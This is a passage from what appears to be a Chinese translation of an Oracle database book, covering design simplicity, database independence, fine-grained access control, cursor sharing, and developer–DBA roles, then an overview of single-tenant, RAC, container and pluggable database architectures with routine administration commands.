  就是这样——现在，任何拥有 `ONE_SESSION` 配置文件的用户都只能登录一次。当我提出这个解决方案时，通常能听到手拍额头的声响，紧接着是那句“我从来不知道它还能这样做”。花时间熟悉你手头工具的能力，可以在开发过程中为你节省大量的时间和精力。


  同样的“保持简单”原则也适用于更宏观的架构层面。我强烈建议人们在采用非常复杂的实现方案之前，要深思熟虑。系统中的可变部分越多，可能出错的地方就越多，而在一个过于复杂的架构中精确追踪错误发生的位置绝非易事。使用无数层架构来实现可能真的很“酷”，但如果一个简单的存储过程就能更好、更快、更省资源地完成任务，那复杂架构就不是正确的选择。


  我曾见过一些项目，应用开发已经进行了好几个月，却依然看不到尽头。开发者们使用的是最新最好的技术和语言，但开发进度并不快。这原本并不是一个庞大的应用——也许问题恰恰就在于此。如果你在建一个狗窝（一个小木工活），你不会动用重型机械。你会使用一些小型电动工具，但根本用不上那些“大家伙”。另一方面，如果你在建造一栋公寓楼，你会雇佣数百人来参与这个项目；你会使用大型机器——你会用完全不同的工具来解决这个问题。应用开发也是如此。没有单一的“完美架构”，没有单一的“完美语言”，也没有唯一的“完美方法”。


  例如，为了构建我的网站，我使用了 APEX（Application Express）。我的网站是一个规模较小的应用；只有一两个开发者参与开发。它大概有 20 个屏幕。对于这个实现来说，PL/SQL
  和 APEX 是正确的选择——它不需要几十号人用 Java 编码、制作 EJB、使用 Hibernate 等等。这是一个简单的问题，用简单的方式解决了。当今确实有一些复杂、大规模、巨型的应用（我们大多购买现成的：如
  HR 系统、ERP 系统等），但更多的是成千上万的小型应用。我们需要为工作选择合适的方法和工具。


  我永远会选择那个能完全解决问题、且最简单的架构，而不是复杂的那个。回报可能是巨大的。每种技术都有其适用的位置。并非每个问题都是钉子，所以我们不能只用工具箱里的锤子。



  ## 开放性


  我经常看到人们因为另一个原因而采取困难的方式行事，这再次涉及到一个理念：我们应当不惜一切代价追求开放性和数据库独立性。开发者希望避免使用封闭、专有的数据库特性——即便是像存储过程或序列这样简单的特性——因为这样做会将他们锁定在某个数据库系统中。那么，让我提出这样一个观点：当你开发一个读写应用程序的那一刻，你已经在某种程度上被锁定了。一旦开始运行查询和数据修改，你就会发现数据库之间存在细微（有时甚至不那么细微）的差异。例如，在某个数据库中，你可能会发现`SELECT
  COUNT(*) FROM T`会与一个简单的两行数据更新操作发生死锁。而在 Oracle 中，你会发现`SELECT COUNT(*)`永远不会阻塞正在更新被统计数据的写入者。你可能遇到过这样的情况：由于数据库锁定模型的副作用，某个业务规则似乎在其中一个数据库中被强制执行，但在另一个数据库中却未被执行。你会发现，在完全相同的混合事务下，不同数据库生成的报告会得出不同的答案，这完全是因为基本实现的差异。你会发现，能够直接从一个数据库迁移到另一个数据库的应用程序非常罕见。SQL
  的解释（例如，`NULL=NULL`的例子）和处理方式上的差异将始终存在。


  在一个项目中，开发者们正在使用 Visual Basic、ActiveX 控件、IIS 服务器和 Oracle 数据库构建一个基于 Web 的产品。我被告知，开发团队表示担忧，因为业务逻辑是用`PL/SQL`编写的，导致产品变得依赖于数据库，并且被问道：“我们该如何纠正这个问题？”


  我对这个问题感到有点惊讶。查看他们选择的技术列表时，我无法理解依赖数据库为何是一件“坏事”：


  *   开发者选择了一种语言，这使他们锁定在单一供应商提供的单一操作系统上（他们本可以选择 Java）。

  *   他们选择了一种组件技术，这使他们锁定在单一操作系统和供应商上（他们本可以选择 J2EE）。

  *   他们选择了一个 Web 服务器，这使他们锁定在单一供应商和单一平台上（为什么不选择更开放的技术呢？）。


  他们所做的其他每一项技术选择都将他们锁定在非常具体的配置中——事实上，唯一在操作系统方面为他们提供了一些选择的技术就是数据库。


  尽管如此（他们选择那些技术肯定有充分的理由），我们仍然看到一群开发者做出有意识的决定，不去使用其架构中一个关键组件的功能，并且是以开放性的名义这样做。我相信，你应该仔细挑选技术，然后尽可能充分地利用它们。你为这些技术付出了高昂的代价——充分挖掘它们的潜力难道不是最符合你利益的吗？我不得不假设他们期待充分利用其他技术的全部潜力，那么为什么数据库是个例外？考虑到数据库对他们的成功至关重要，这个问题甚至更难回答。


  如果我们从开放性的角度来审视这个论点，可以稍微改变一下视角。你将所有数据放入数据库中。数据库是一个非常开放的工具。它支持通过大量开放系统协议和访问机制进行数据访问。到目前为止听起来很棒，堪称世界上最开放的东西。


  然后，你将所有应用逻辑，更重要的是，将你的安全机制都放在数据库之外。也许是在访问数据的 Bean 中。也许是在访问数据的 JSP 中。也许是在你的 Visual
  Basic 代码中。也许是在 Hibernate 生成的代码中。最终结果是，你刚刚关闭了你的数据库——你让它变得“不开放”了。人们无法再接入现有技术来利用这些数据；他们必须使用你的访问方法（或者干脆绕过安全机制）。这在今天看来似乎很好，但你必须记住，今天的尖端技术是昨天的概念，并将成为明天陈旧疲惫的技术。在关系型世界（很可能大多数对象实现也是如此）中，历经三十多年依然屹立不倒的是数据库本身。数据的前端几乎每年都在变化，而当它们变化时，那些将所有安全机制都内置于自身、而非置于数据库中的应用程序，就成了未来发展的障碍和绊脚石。


  Oracle 数据库提供了一个称为细粒度访问控制（`FGAC`）的功能。简而言之，这项技术允许开发者在数据库中嵌入过程，这些过程可以在查询提交给数据库时对其进行修改。这种查询修改用于限制客户端将接收或修改的行。该过程可以查看是谁在执行查询、何时执行查询、是哪个应用程序请求数据、他们是从哪个终端执行查询等等，并可以据此适当地限制数据访问。通过`FGAC`，我们可以强制执行安全策略，例如：


  *   由某类用户在正常工作时间之外执行的任何查询都返回零条记录。

  *   任何数据都可以返回到安全设施内的终端，但只有非敏感信息可以返回到远程客户端终端。


  基本上，`FGAC`允许我们将访问控制定位在数据库中，紧挨着数据。用户是从 Bean、JSP、使用`ODBC`的 Visual Basic 应用程序还是`SQL*Plus`来访问数据变得不再重要——相同的安全协议都将被强制执行。你已经为即将到来的下一项技术做好了充分准备。


  现在我问你，哪种实现更“开放”？是那种使得所有对数据的访问只能通过调用 Visual Basic 代码和 ActiveX 控件（如果你愿意，可以用 Java 代替
  Visual Basic，用 EJB 代替 ActiveX——我并非在针对某项特定技术，而是在评论一种实现）来完成的方案，还是那种允许任何能与数据库对话的东西进行访问，通过诸如`SSL`、`HTTP`和
  Oracle Net（以及其他）等多样化的协议，或者使用`ODBC`、`JDBC`、`OCI`等 API 来实现的方案？我还没有见过哪个即席查询工具会去“查询”你的
  Visual Basic 代码。但我知道有几十种工具可以执行 SQL。


  人们完全有自由做出追求数据库独立性和完全开放的决定，很多人也尝试这样做，但我相信这是个错误的决定。无论你使用什么数据库，都应该充分利用它，尽可能地榨干该产品的每一项功能。无论如何，你会在调优阶段（这似乎总是发生在部署之后不久）发现自己这样做。令人惊讶的是，仅仅通过利用数据库软件的能力就能让应用程序运行速度提升五倍时，数据库独立性的要求可以多么迅速地被抛弃。



  ## 如何让它运行得更快？


  标题中的这个问题是我经常被问到的。每个人都在寻找那个 `fast = true` 的开关，认为“数据库调优”就意味着你去调整数据库。事实上，根据我的经验，超过
  80%（经常是 100%）的性能提升，都体现在应用设计和实现层面，而非数据库层面。在调整运行于数据库之上的应用程序之前，你无法有效地调优数据库。


  随着时间的推移，我们可以在数据库层面设置一些开关，以帮助减轻粗劣编程错误的冲击。例如，Oracle 有一个参数 `CURSOR_SHARING=FORCE`。可以说，这个特性实现了一个
  `自动绑定器`。它会静默地将写成 `SELECT * FROM EMP WHERE EMPNO = 1234` 的查询，为我们重写为 `SELECT * FROM
  EMP WHERE EMPNO = :x`。这 `可以` 显著减少硬解析的数量，并减少我们在“架构”部分讨论过的库闩锁等待——`但是`（总是有个“但是”）它可能带来一些副作用。使用游标共享时，一个常见的副作用是这样的：


  ```

  SQL> select /* TAG */ substr( username, 1, 1 )

  from all_users au1

  where rownum = 1;

  S

  -

  S

  SQL> alter session set cursor_sharing=force;

  Session altered.

  SQL> select /* TAG */ substr( username, 1, 1 )

  from all_users au2

  where rownum = 1;

  SUBSTR(USERNAME,1,1)


  S

  ```


  那里发生了什么？为什么第二个查询（可以说是一样的查询）由 `SQL*Plus` 报告的列突然变得这么大？如果我们看看游标共享设置为我们做了什么，这一点（以及其他一些东西）就会变得显而易见：


  ```

  SQL> select sql_text from v$sql where sql_text like ''select /* TAG */ %'';

  SQL_TEXT


  select /* TAG */ substr( username, 1, 1 )

  from all_users au1

  where rownum = 1

  select /* TAG */ substr( username, :"SYS_B_0", :"SYS_B_1" )

  from all_users au2

  where rownum = :"SYS_B_2"

  ```


  游标共享从查询中移除了信息。它找到了 `每一个` 字面量，包括我们正在使用的 `substr` 常量。它将它们从查询中移除，并用绑定变量替换。SQL 引擎不再知道该列是长度为
  1 的 `substr` 结果——它的长度是不确定的。此外，你可以看到 `where rownum = 1` 现在也被绑定了。这看起来是个好主意；然而，优化器刚刚被移除了一些重要信息。它不再知道“这个查询将检索单行”；它现在认为“这个查询将返回前
  N 行，而 N 可以是任何数字”。这会对生成的查询计划产生负面影响。


  此外，我已经表明，虽然 `CURSOR_SHARING=FORCE` 比解析和优化大量独特的查询运行得快得多（请参阅前面关于绑定变量的部分），但我也发现它比开发者自行进行绑定的查询要慢。这并非源于游标共享代码的任何低效，而是源于程序本身的低效。在许多情况下，不使用绑定变量的应用程序在解析和重用游标方面也效率低下。因为应用程序认为每个查询都是唯一的（它将它们构建为唯一的语句），它永远不会使用同一个游标超过一次。事实是，如果程序员一开始就使用了绑定变量，他们本可以解析一次查询并重用多次。正是这种解析的开销降低了整体的潜在性能。


  ### 注意

  同样重要的是要指出，`CURSOR_SHARING=FORCE` 不会修复 SQL 注入漏洞。绑定发生在你的最终用户重写查询之后；SQL 注入已经发生了。`CURSOR_SHARING=FORCE`
  并不会让你比以前更安全。只有通过使用绑定变量本身，开发者才能实现一个防 SQL 注入的应用程序。


  基本上，重要的是要记住，简单地开启 `CURSOR_SHARING = FORCE` 并不一定能解决你的问题。它很可能会引入新的问题。`CURSOR_SHARING`
  在某些情况下是一个非常有用的工具，但它不是万能药。一个开发良好的应用程序永远不需要它。从长远来看，在适当的地方使用绑定变量，在需要时使用常量，才是正确的方法。


  ### 注意

  没有万能药，一个都没有。如果有，它们就会成为默认行为，你也就永远听不到它们了。


  即使数据库层面确实可以设置一些开关（而且它们确实少之又少），与并发问题以及执行糟糕的查询（由于查询写得不好或数据结构不佳）相关的问题，是无法通过一个开关来修复的。这些情况需要重写（并且经常需要重新架构）。移动数据文件、调整参数以及其他数据库层面的开关，通常对应用程序的整体性能影响甚微。这绝对达不到你为了使得应用程序可接受而需要实现的两倍、三倍……`n`
  倍的性能提升。你的应用程序有多少次只是慢了百分之十？慢百分之十，没人会抱怨。慢上五倍，人们就会生气了。我重申：通过移动数据文件，你无法获得五倍的性能提升。你只有通过修复应用程序，或许通过让它执行显著更少的
  I/O，才能实现大幅度的性能提升。


  ### 注意

  这只是想说明事物是如何随时间变化的。我经常写道，通过移动数据文件，你无法获得五倍的性能提升。但是随着 Oracle Exadata 等硬件解决方案的出现，你实际上可以通过简单地移动数据文件，将响应时间（返回数据所需的时间）减少五倍、十倍、五十倍甚至更多。但这更像是一个“我们彻底改变了硬件架构”的故事，而不是“我们重组了一些存储”。此外，让应用程序在
  Exadata 上仅仅运行快五倍或十倍对我来说会是令人失望的——我会希望它“快”五十倍或更多——这需要重新思考应用程序的实现方式。


  性能是设计、构建和测试工作贯穿整个开发阶段都必须持续关注的事情。它绝不应该是事后才考虑的东西。我常常惊讶于人们经常等到应用程序已经交付给客户、部署到位并实际运行之后，才开始对其进行调优。我见过一些实现，其中应用程序交付时除了主键之外，没有任何其他索引。查询从未经过调优或压力测试。应用程序从未在超过少量用户的情况下进行过试用。调优被认为是产品安装的一部分。对我来说，这是一种不可接受的方式。你的最终用户应该从第一天起就得到一个响应迅速、全面调优的系统。会有足够多的“产品问题”需要处理，而不应该让糟糕的性能成为用户的首个体验。用户期望新应用程序有一些错误，但至少不要让用户在痛苦的长时间等待中看着那些错误出现在屏幕上。




  ### DBA 与开发者的关系


  毋庸置疑，最成功的系统建立在数据库管理员（DBA）与应用程序开发者之间的共生关系之上。在本节中，我将从开发者的视角，探讨开发者与 DBA 之间的分工（假设每个严肃的开发项目都配备有
  DBA 团队）。


  作为开发者，你未必需要知道如何安装和配置软件。这应该是 DBA，或许还有系统管理员（SA）的职责。设置 Oracle Net、启动监听器、配置共享服务器、启用连接池、安装数据库、创建数据库等等——这些功能我都归入
  DBA/SA 的职责范畴。


  一般来说，开发者无需知道如何调优操作系统。我自己通常将这项任务留给系统的 SA。作为数据库应用软件的开发者，你需要熟练使用你所选择的操作系统，但不应期望自己还需要去调优它。


  DBA 最大的单一职责是数据库的恢复与还原。注意，我说的不是“备份”，而是“还原与恢复”，并且我认为这是 DBA 的唯一职责。理解回滚和重做机制如何工作——是的，这是开发者必须了解的。而知道如何执行表空间时间点恢复，开发者则可以略过。知道可以做到这一点可能有用，但真正需要执行它——不，这不是你的事。


  在数据库实例级别进行调优，并确定最佳的 `PGA_AGGREGATE_TARGET` 值——这通常是 DBA 的工作（而且数据库非常愿意并能够协助他们确定正确的数值）。在特殊情况下，开发者可能需要为会话更改某些设置，但在数据库级别，这是
  DBA 的责任。一个典型的数据库支持的不仅仅是单个开发者应用。只有支持所有应用的 DBA 才能做出正确的决策。


  分配空间和管理文件是 DBA 的工作。开发者提供他们对空间需求的预估（他们认为自己需要多少），但其余的事情由 DBA/SA 处理。


  基本上，开发者不需要知道如何运行数据库。他们需要知道如何在数据库中运行。开发者和 DBA 就像是在处理同一个谜题的不同部分。当你的查询消耗了太多资源时，DBA
  会来找你；而当你无法想出如何让系统运行得更快时（那时才进行实例调优，在应用完全调优之后），你会去找 DBA。


  这一切因环境而异，但我认为其中确实存在分工。一个好的开发者通常是一个很糟糕的 DBA，反之亦然。在我看来，他们是两种不同的技能组合、两种不同的思维模式和两种不同的个性。


  ## 总结


  在本章中，我们通过一些实例探讨了为何你需要了解数据库。我所举的例子并非孤立事件——它们日复一日地发生着。我观察到此类问题不断循环往复。


  让我们快速回顾一下要点。如果你正在使用 Oracle 进行开发：


  *   你需要理解 Oracle 架构。你不必精通到能重写服务器的程度，但应该足够了解，以便清楚使用特定功能所带来的影响。

  *   你需要理解锁和并发控制，并且要知道每个数据库实现这些功能的方式都*不同*。如果不了解，你的数据库就会给出“错误”的答案，你将遇到严重的争用问题，导致性能低下。

  *   不要将数据库视为一个无需理解的黑盒。数据库是大多数应用中最关键的部分。试图忽视它将是致命的。

  *   不要重复发明轮子。我见过不止一个开发团队因此陷入困境，不仅在技术层面，也在人际关系层面，原因在于他们不了解 Oracle 免费提供的功能。当有人指出他们花了过去几个月时间实现的特性其实是数据库一直以来的核心功能时，这种情况就会发生。请阅读*《Oracle
  数据库概念》*指南——新特性指南——这些随软件免费提供的文档！

  *   尽可能简单地解决问题，尽可能多地使用 Oracle 的内置功能。你为它付出了高昂的代价。

  *   软件项目来了又去，编程语言和框架也是如此。我们开发者被期望在几周，也许是几个月内让系统上线运行，然后转向下一个问题。如果你一遍又一遍地重新发明轮子，你将永远无法跟上疯狂的开发节奏。正如你不会在
  Java 中自己构建哈希表类一样——因为它自带了——你应该使用你手头可用的数据库功能。当然，做到这一点的第一步，就是了解你手头到底有什么。请继续阅读。


  基于最后一点，软件项目和编程语言可能会更迭——但*数据*是永恒的。我们构建使用数据的应用程序，而这些数据将被许多应用程序随时间推移而使用。重点不在于应用程序，而在于数据。使用允许数据被使用和重用的技术和实现方式。如果你将数据库仅仅当作一个数据桶，使得所有对数据的访问都必须通过你的应用程序，那你就本末倒置了。你无法对你的应用程序进行“即席查询”。你无法在旧应用程序之上构建新的应用程序。但是，如果你使用了数据库，你会发现随着时间的推移，添加新的应用程序、报告或其他任何东西都会容易得多。




  '
- '# 2. 架构概览


  Oracle 被设计为一款高度可移植的数据库——它覆盖了所有相关平台，从 Windows 到 UNIX/Linux，再到基于云的系统。然而，Oracle 的物理架构在不同的操作系统上表现各异。例如，在
  UNIX/Linux 操作系统上，Oracle 被实现为许多独立的操作系统进程，几乎每个主要功能对应一个进程。在 UNIX/Linux 上，这是正确的实现方式，因为它基于多处理器架构。但在
  Windows 上，这种架构就不合适了，运行效果会很差（速度慢且无法扩展）。在 Windows 平台上，Oracle 被实现为一个包含多个线程的单一进程。尽管在不同平台上实现
  Oracle 所采用的物理机制各不相同，但其架构具有足够的通用性，足以让你透彻理解 Oracle 在所有平台上的工作方式。


  本章，我将概述这一架构。我们将审视 Oracle 服务器，并定义一些术语，如 `数据库`、`实例`、`容器数据库`、`可插拔数据库`、`真正应用集群 (RAC)
  数据库` 以及 `分片数据库`。我们还会了解当您“连接”到 Oracle 时会发生什么，并从高层视角看服务器如何管理内存。在接下来的三章中，我们将详细探讨 Oracle
  架构的三大核心组件：


  *   第 3 章涵盖文件。我们将了解构成数据库的五大类文件：`参数文件`、`数据文件`、`临时文件`、`控制文件` 和 `重做日志文件`。我们还将介绍其他类型的文件，包括
  `跟踪文件`、`警报文件`、`转储 (DMP) 文件`、`数据泵文件` 以及 `简单平面文件`。我们将考察名为 `快速恢复区 (FRA)` 的文件存储区域，并讨论
  `自动存储管理 (ASM)` 对文件存储的影响。


  *   第 4 章涵盖被称为 `系统全局区 (SGA)`、`程序全局区 (PGA)` 和 `用户全局区 (UGA)` 的 Oracle 内存结构。我们将审视这些结构之间的关系，并讨论
  `共享池`、`大池`、`Java 池` 以及 `SGA` 的其他各种组件。


  *   第 5 章涵盖 Oracle 的物理进程或线程。我们将了解将在数据库上运行的三种不同类型的进程：`服务器进程`、`后台进程` 和 `从属进程`。


  在决定首先介绍哪个组件时颇费思量。进程会使用 `SGA`，因此在讨论进程之前讨论 `SGA` 可能不合逻辑。另一方面，在讨论进程及其功能时，又需要引用 `SGA`。这两个组件紧密相连：文件由进程操作，如果不首先理解进程的功能，文件的概念也无从谈起。


  因此，我打算先定义一些术语，并给出 Oracle 架构的概览（就像在白板上画出来那样）。需要了解两种基本架构。一种是 Oracle 数据库从版本 6 到 11g
  一直独家采用的架构（本书中现在称之为 `单租户` 架构），以及从 Oracle 12c 开始可用的新型多租户架构（`容器数据库`/`可插拔数据库`）。此外，我还将描述两种
  Oracle 数据库的变体，即 `Oracle 真正应用集群 (RAC)` 和 `Oracle 分片数据库`。之后，您就可以准备深入一些细节了。


  ## 数据库类型


  有两个术语在 Oracle 语境中使用时，似乎会引起很大的混淆：`数据库` 和 `实例`。公平地说，部分原因在于不同的数据库供应商使用相同的术语来表示不同的含义。在
  Oracle 的术语中，`数据库` 是物理操作系统文件或磁盘的集合。当使用 `Oracle 自动存储管理 (ASM)` 时，数据库在操作系统中可能不会表现为独立、分散的文件，但其定义保持不变。


  相比之下，`实例` 是一组 Oracle 后台进程（或线程）和一个共享内存区，即运行在单台计算机上的那些线程或进程之间共享的内存。这是存放易失性、非持久化数据的地方，其中部分数据会被刷新到磁盘。一个数据库实例可以完全不依赖任何磁盘存储而存在。这可能不是世界上最有用的东西，但这样思考无疑有助于划清实例与数据库之间的界限。


  `实例` 和 `数据库` 这两个术语有时被互换使用，但它们包含的概念大相径庭，尤其是在多租户架构和 `Oracle 真正应用集群 (RAC)` 架构中。在 Oracle
  的早期版本中，实例与数据库之间通常是一对一的关系。这可能是围绕这些术语产生混淆的原因。然而，从技术角度精确地说，`实例` 指的是 Oracle 的进程和内存。而
  `数据库` 指的是保存数据的物理文件。一个数据库可以被多个实例访问，但一个实例一次将且仅提供对一个数据库的访问（无论数据库类型为何）。这一点稍后会变得更加清晰。接下来，让我们看看单租户数据库的定义。




  ### 单租户（非容器）数据库


  一个`单租户数据库或非容器数据库`是一个自包含的数据文件、控制文件、重做日志文件、参数文件等的集合。除了所有的应用程序元数据、数据和代码外，它还包含所有 Oracle
  元数据（例如`ALL_OBJECTS`的定义）、Oracle 数据和 Oracle 代码（如`DBMS_OUTPUT`的代码）。这是 Oracle 12c 版本之前唯一存在的数据库类型。


  图 2-1 描述了单租户数据库架构。数据库名称为`ORCL`，实例名称也为`ORCL`。客户端通过连接到数据库监听器来发起对`ORCL`实例的连接。监听器将连接移交给一个数据库服务器进程。从那时起，数据库服务器进程负责处理客户端发送的用于查看或操作数据的任何
  SQL 请求。


  ![../images/319655_4_En_2_Chapter/319655_4_En_2_Fig1_HTML.jpg](img/319655_4_En_2_Fig1_HTML.jpg)


  图 2-1：Oracle 的单租户（非容器数据库）架构


  图 2-1 显示你拥有一个数据库服务器（有时称为主机、机器、虚拟机、节点等）。在该数据库服务器上，你有一个实例（内存结构、后台进程和其他进程）和一个数据库（磁盘上的物理文件）。内存结构与访问和操作数据（磁盘上的数据文件）的客户端（用户）进程进行交互。客户端连接到在数据库服务器上运行的监听器进程。然后，监听器将连接移交给一个服务器进程，该进程处理来自客户端的
  SQL 处理请求。


  与数据库文件分开的是 Oracle 安装软件文件（有时称为二进制文件）。它们通常安装在磁盘上名为`ORACLE_HOME`的位置（各种组件存储在子目录中）。二进制文件的例子包括`oracle`、`sqlplus`、`rman`、`dbca`、`expdp`、`impdp`、`lsnrctl`等。


  实例启动后，你可以通过`ipcs`命令（在 UNIX/Linux 上）查看其内存组件：


  ```

  $ ipcs

  ```


  以下是输出的一个片段：


  ```

  ------ Shared Memory Segments --------

  key        shmid      owner      perms      bytes      nattch     status

  0x00000000 42         oracle     600        8908800    104

  0x00000000 43         oracle     600        1056964608 52

  0x00000000 44         oracle     600        7868416    52

  0x43f8ffbc 45         oracle     600        24576      52

  ```


  要查看与`ORCL`实例关联的系统监控器后台进程，你可以发出进程状态命令（在 UNIX/Linux 上）：


  ```

  $ ps -ef | grep smon

  oracle    7969     1  0 22:43 ?        00:00:00 ora_smon_ORCL

  ```


  我们可以通过以下查询查看与`ORCL`数据库关联的数据文件：


  ```

  $ sqlplus / as sysdba

  SQL> select name from v$datafile;

  NAME


  /opt/oracle/oradata/ORCL/ORCL/datafile/o1_mf_system_j480tkhg_.dbf

  /opt/oracle/oradata/ORCL/ORCL/datafile/o1_mf_sysaux_j480vnpn_.dbf

  /opt/oracle/oradata/ORCL/ORCL/datafile/o1_mf_undotbs1_j480wfwd_.dbf

  /opt/oracle/oradata/ORCL/ORCL/datafile/o1_mf_users_j480wgz7_.dbf

  ```


  总而言之，前面的例子创建了一个单租户（非容器）类型的数据库。这种单租户类型的数据库架构已被 Oracle 弃用。此外，Oracle 已声明，从 Oracle 21c
  开始，单租户架构将不再提供支持。尽管如此，这种类型的数据库仍然被广泛使用。许多在旧版 Oracle 上运行的遗留系统仍然使用这种架构。因此，熟悉这种类型的数据库架构非常重要。


  ### 单租户（非容器）RAC 数据库


  在 Oracle 实时应用集群（RAC）这一特殊情况下，RAC 是 Oracle 的一个选项，允许其在集群环境中的多台计算机上运行，我们可能有多个实例同时挂载和打开这一个位于一组共享物理磁盘上的数据库。换句话说，一个
  RAC 数据库由一个或多个连接到一个数据库的实例组成。多个 RAC 实例运行在不同的服务器（节点或主机）上。所有实例共享相同的数据库（磁盘上的文件）。RAC 数据库是为高可用性、性能和可扩展性而设计的。其理念是，当你需要更多的
  CPU 和内存处理能力时，可以添加更多的实例（节点）。此功能需要额外的 Oracle 许可才能使用。图 2-2 描述了 RAC 架构。这个 RAC 数据库有两个实例，分别名为`ORCL1`和`ORCL2`。两个实例都连接到一个单一的`ORCL`数据库。


  ![../images/319655_4_En_2_Chapter/319655_4_En_2_Fig2_HTML.jpg](img/319655_4_En_2_Fig2_HTML.jpg)


  图 2-2：双节点 RAC 配置中的 Oracle 单租户（非容器数据库）架构


  客户端连接到一个特殊的单一客户端访问名称（SCAN）RAC 监听器，该监听器将连接请求移交给其中一个数据库监听器（在此示例中为节点 1 上的监听器）。然后，监听器将客户端请求连接到`HR1`实例中的一个服务器进程，该进程随后处理客户端发起的任何
  SQL 处理。在此配置中，你可以有一个或多个节点。每个实例使用相同的物理`ORCL`数据库。RAC 软件负责处理多个实例可能同时访问单一数据库数据文件集中相同数据块所带来的复杂性。


  除了 Oracle 主目录二进制文件外，RAC 配置还需要 Grid Infrastructure 软件，其中包括用于管理共享磁盘的自动存储管理（ASM）软件。Grid
  软件通常安装在磁盘上名为`GRID_HOME`的位置（各种组件存储在子目录中）。Grid 主目录软件与 Oracle 主目录软件是分开的。


  总而言之，图 2-2 中描述的数据库是一个单租户的两节点 RAC 数据库。同样，这种单租户类型的数据库已被 Oracle 弃用，并将从 Oracle 21c 开始不再提供支持。



  ### 多租户容器数据库


  从 Oracle 12c 开始，Oracle 引入了一种新型数据库：多租户容器数据库及相关的可插拔数据库。一个 `多租户容器数据库 (CDB)` 或 `根容器数据库`
  是一组自包含的数据文件、控制文件、重做日志文件、参数文件等，其中仅包含 Oracle 元数据、Oracle 数据和 Oracle 代码。这些数据文件中不包含任何应用程序对象或代码——只有
  Oracle 提供的元数据和 Oracle 提供的代码对象。该数据库是自包含的，因为它可以在没有任何其他支持性物理结构的情况下被挂载和打开。


  ### 可插拔数据库


  一个 `可插拔数据库 (PDB)` 仅是一组数据文件。它不是自包含的。可插拔数据库需要一个容器数据库来“插入”，以便被打开和访问。这些数据文件只包含应用程序对象的元数据、应用程序数据以及这些应用程序的代码。这些数据文件中没有
  Oracle 元数据或任何 Oracle 代码。没有重做日志文件、控制文件、参数文件等——只有与可插拔数据库关联的数据文件。可插拔数据库从它当前插入的容器数据库继承这些其他类型的文件。


  一个可插拔数据库一次只与一个容器数据库关联，并且仅与一个实例间接关联；它将共享为挂载和打开容器数据库而创建的实例。因此，与容器数据库类似，一个可插拔数据库在任何时间点可以与一个或多个实例关联。根容器实例可能同时为多个（数千个）可插拔数据库提供访问。也就是说，单个实例可能为多个可插拔数据库提供服务，但只为一个容器数据库服务。


  ### 架构与连接性


  图 2-3 展示了容器数据库及其关联的可插拔数据库的架构。容器实例名为 `CDB`，根容器也名为 `CDB`。有两个可插拔数据库（`PDB1` 和 `PDB2`）附加到此容器数据库。


  ![../images/319655_4_En_2_Chapter/319655_4_En_2_Fig3_HTML.jpg](img/319655_4_En_2_Fig3_HTML.jpg)


  *图 2-3：一个包含两个可插拔数据库的容器数据库*


  如图所示，客户端发起到 `PDB1` 可插拔数据库的连接。监听器将客户端连接到处理 SQL 请求的服务器进程。在此配置中，客户端连接到 `CDB` 实例并访问
  `PDB1` 可插拔数据库。客户端无法看到容器内的任何其他可插拔数据库。换句话说，客户端只能访问其当前连接到的可插拔数据库（本例中为 `PDB1`）内的数据。


  此容器数据库只关联一个实例 (`CDB`)。我们可以通过以下方式查看此实例的系统监控进程：


  ```

  $ ps -ef | grep smon

  oracle   19362     1  0 00:29 ?        00:00:00 ora_smon_CDB

  ```


  我们可以查看与根容器数据库以及可插拔数据库关联的数据文件。首先，连接到根容器：


  ```

  $ sqlplus / as sysdba

  ```


  在连接到根容器后，我们可以查看与根容器和两个可插拔数据库关联的所有数据文件：


  ```

  SQL> select name from v$datafile;

  NAME


  /opt/oracle/oradata/CDB/system01.dbf

  /opt/oracle/oradata/CDB/sysaux01.dbf

  /opt/oracle/oradata/CDB/undotbs01.dbf

  /opt/oracle/oradata/CDB/pdbseed/system01.dbf

  /opt/oracle/oradata/CDB/pdbseed/sysaux01.dbf

  /opt/oracle/oradata/CDB/users01.dbf

  /opt/oracle/oradata/CDB/pdbseed/undotbs01.dbf

  /opt/oracle/oradata/CDB/PDB1/system01.dbf

  /opt/oracle/oradata/CDB/PDB1/sysaux01.dbf

  /opt/oracle/oradata/CDB/PDB1/undotbs01.dbf

  /opt/oracle/oradata/CDB/PDB1/users01.dbf

  /opt/oracle/oradata/CDB/PDB2/system01.dbf

  /opt/oracle/oradata/CDB/PDB2/sysaux01.dbf

  /opt/oracle/oradata/CDB/PDB2/undotbs01.dbf

  /opt/oracle/oradata/CDB/PDB2/users01.dbf

  ```


  要连接到 `PDB1` 数据库，我在连接字符串中使用 `PDB1` 服务（稍后会详细介绍）：


  ```

  $ sqlplus system/foo@localhost:1521/PDB1

  ```


  连接到 `PDB1` 时，无法看到数据库中的任何其他容器。就 `PDB1` 可插拔数据库而言，它看不到其他任何数据库。例如，查询数据文件名称只显示与 `PDB1`
  可插拔数据库关联的数据文件：


  ```

  SQL> select name from v$datafile;

  NAME


  /opt/oracle/oradata/CDB/PDB1/system01.dbf

  /opt/oracle/oradata/CDB/PDB1/sysaux01.dbf

  /opt/oracle/oradata/CDB/PDB1/undotbs01.dbf

  /opt/oracle/oradata/CDB/PDB1/users01.dbf

  ```


  这意味着你可以在 `PDB1` 中放置一个应用程序及其所有用户和对象，同时可以在 `PDB2` 中放置一个完全不同的应用程序。这两个数据库之间的用户和对象不会发生冲突。它们在物理上是作为两个独立的可插拔数据库（在一个容器数据库内）实现的。


  ### 职责总结


  多个可插拔数据库，从属于容器数据库，可以同时打开并可访问——但都将共享为打开容器数据库而创建的单个实例。一个可插拔数据库为了被使用、被查询，必须与一个容器数据库关联。该容器数据库将只包含
  Oracle 数据和元数据——即 Oracle “运行”所需的信息。可插拔数据库则拥有数据库元数据和数据的“其余部分”。


  例如，容器数据库将包含 "`SYS`" 用户的定义（`SYS` 用户的元数据），以及诸如 `DBMS_OUTPUT` 和 `UTL_FILE` 等对象的编译代码和源代码。而可插拔数据库则包含应用程序模式（如
  `SCOTT`）的定义，描述 `SCOTT` 模式中所有表的元数据，`SCOTT` 模式的所有 PL/SQL 源代码，授予 `SCOTT` 模式的所有 `GRANTS`，等等。简而言之，可插拔数据库拥有描述一组应用程序模式的所有内容——账户的元数据、这些账户中表的元数据以及这些表的实际数据。可插拔数据库就其所包含的应用程序账户而言是自包含的，但它需要一个容器数据库来被“打开”和查询。因此，可以说可插拔数据库不是“自包含的”，它需要其他东西才能被打开和使用。


